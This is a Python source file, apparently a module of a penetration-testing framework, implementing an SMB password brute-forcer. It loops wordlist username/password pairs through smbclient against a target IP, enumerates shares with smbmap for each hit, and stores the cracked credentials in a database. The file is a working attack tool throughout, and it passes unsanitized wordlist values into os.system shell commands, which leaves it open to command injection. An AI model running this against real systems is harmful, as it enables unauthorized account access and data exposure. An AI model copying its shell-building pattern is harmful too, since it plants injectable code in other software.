#!/usr/bin/env python3

import os
import argparse
import sys
import extrac_dir_file_bruteforce
import DB_connect

class smbbruteforce:
    def bruteforce(self, id_j ,ip, username, password):

        id_job = id_j
        target = ip



        found = []
        try:
            users = open(username, 'r')
            users = users.read().split("\n")
            users.pop()
        except:
            print("[!]  Unable to open File ==> {}".format(username))
            sys.exit()

        try:
            passwd = open(password, 'r')
            passwd = passwd.read().split("\n")
            passwd.pop()
        except:
            print("[!]  Unable to open File ==> {}".format(password))
            sys.exit()
        os.system("mkdir DUMP")
        for u in users:
            p = ' '
            try:
                if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) == 256:
                    for p in passwd:
                        try:
                            print("test "+ u +" on password "+ p)
                            if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) != 256:
                                found.append("{}:{}".format(u, p))
                        except:
                            print("error on utente:{} and pass: {} ".format(u, p))
            except:
                print("error on utente:{} and pass: {} ".format(u, p))

        os.system("clear")
        os.system("rm -rf DUMP")
        print("user: " + str(found))
        if found == []:
            print("[*] NO MATCH FOUND ! ")
        else:
            print("[!!]MATCH FOUND ! GETTING SHARES ....\n")
            print("+----------------------------------------------------------------------+")
            for x in found:
                u = x.split(":")[0]
                p = x.split(":")[1]
                print("[*] SHARES FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u, p))
                os.system("./smbmap/smbmap.py  --no-banner --no-update --no-color  -u {} -p {} -H {} -r --csv report_brute_smb.csv".format(u, p, ip, ))
                print("+----------------------------------------------------------------------+")

                connessione_brute = DB_connect.database_connect()
                conn_brute = connessione_brute.database_connection()

                cur_brute = conn_brute.cursor()


                sql_update_query = """INSERT INTO`smb_bruteforce`(`id_bruteforce`, `id_job`, `ip_host` ,`user`, `password`) VALUES (NULL,%s,%s,%s,%s);"""
                input_data = (id_job, target, u, p)

                cur_brute.execute(sql_update_query, input_data)
                conn_brute.commit()
                conn_brute.close()

                parsing_sqlmap = extrac_dir_file_bruteforce.parsing_sqlmap()
                parsing_sqlmap.parsing_sqlmap_report(id_j,u,p)

        print("\n")

